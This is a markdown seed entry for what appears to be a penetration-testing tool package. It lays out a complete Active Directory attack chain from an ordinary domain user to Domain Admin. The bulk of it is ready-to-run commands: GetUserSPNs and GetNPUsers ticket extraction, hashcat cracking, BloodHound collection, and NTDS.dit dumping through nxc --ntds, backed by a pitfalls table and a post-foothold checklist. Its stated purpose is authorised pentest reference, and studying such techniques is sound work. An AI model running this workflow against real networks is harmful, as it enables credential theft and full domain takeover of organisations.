# [Seed] Kerberoasting → Offline Cracking → DA

## Scenario Classification
Penetration Testing / AD Attack

## Goal Overview
With ordinary domain user credentials and a service account configured with an SPN in the target domain, obtain a TGS via Kerberoasting and crack it offline. After recovering the plaintext password, query BloodHound for a path straight to DA.

## Complete Execution Chain

1. Establish a domain foothold (any ordinary user; local administrator is not required).
2. Enumerate SPNs.
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. See which accounts have SPNs configured (usually SQL Server / IIS / custom service accounts).
4. Crack offline.
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Crack the password of some svc account → query BloodHound for that account's reachable paths.
6. If the account is in a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → DCSync directly.
7. If not, but it can RDP/WinRM into a critical machine → get in, dump with mimikatz, and chain the attack to DA.

## Pitfalls

| Issue | Cause | Solution | Time Spent |
|------|------|---------|------|
| GetUserSPNs returns nothing | Current user lacks permission to read SPNs | Any ordinary domain user can; possibly wrong -dc-ip or PreAuth not working | 20min |
| Cracking yields nothing after hours | Password is strong | 1) Switch wordlists (rockyou.txt + corp keywords)  2) Use the GPU (hashcat -d 1)  3) Try the OneRuleToRuleThemAll ruleset | Several hours |
| Obtained password but login fails | Credentials expired or case-sensitive | Verify first with nxc: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound has no data | Data collection missed GPO/ACL | `bloodhound-python -c All` must include All; new BHCE recommends `--zip` | 30min |
| AS-REP Roasting found no targets | Few accounts have "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: `-usersfile users.txt -no-pass` | 15min |

## Toolchain Findings

- **impacket-GetUserSPNs** is the de facto standard and more cross-platform than PowerView.
- **netexec (nxc)** is the successor to CrackMapExec; it is fast and includes modules such as spider_plus / lsassy / ntds.
- **BloodHound Community Edition (BHCE)** is the new version and much faster than old BloodHound.
- The **OneRuleToRuleThemAll** ruleset works best for password cracking.
- **bloodyAD** is a next-generation AD tool specializing in "low-privilege ACL abuse for privilege escalation".

## Key Code/Commands

Complete Kerberoasting workflow:

```bash
# 1. Verify credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. Try AS-REP as well while at it
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Crack offline
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. After cracking the password, collect with BloodHound
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find paths: mark the svc account as Owned, and look at Shortest Path to DA
```

If the svc account can access SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# Directly dump NTDS.dit
```

## Suggestions for This Package

- `pentest-tools/references/network-attack-defense.md` should have a complete Kerberoasting chapter.
- BloodHound CE is now mainstream; bootstrap-manifest should explicitly install `bloodhound-ce-cli`.
- Add `pentest-tools/references/ad-cheatsheet.md` to cover the six major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on one page.

## Reusable Patterns/Script Snippets

**Standard 30-minute actions after gaining a domain foothold**:

```text
1. nxc smb to verify credentials + automatically spider shares
2. GetUserSPNs + GetNPUsers in one go
3. Collect with bloodhound-python -c All
4. Crack offline in parallel (GPU running)
5. While waiting, review Tier 0 / Pre-built attack paths in BloodHound
6. Crack password → mark as Owned → re-query paths
```

**AD Kerberos Hashcat Mode Quick Reference**:

| Mode | Purpose |
|------|---------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (captured by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution Actions
- [ ] Add ad-cheatsheet.md
- [ ] Check nxc / bloodhound-ce / bloodyAD status in tool-index
- [x] Routing matrix already includes Kerberos / Kerberoasting

## Environment Information
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: any foothold within the domain (ordinary domain user)

## Anonymization Requirements
This entry is seed data, written based on public AD attack technical patterns, and does not involve real target domains.
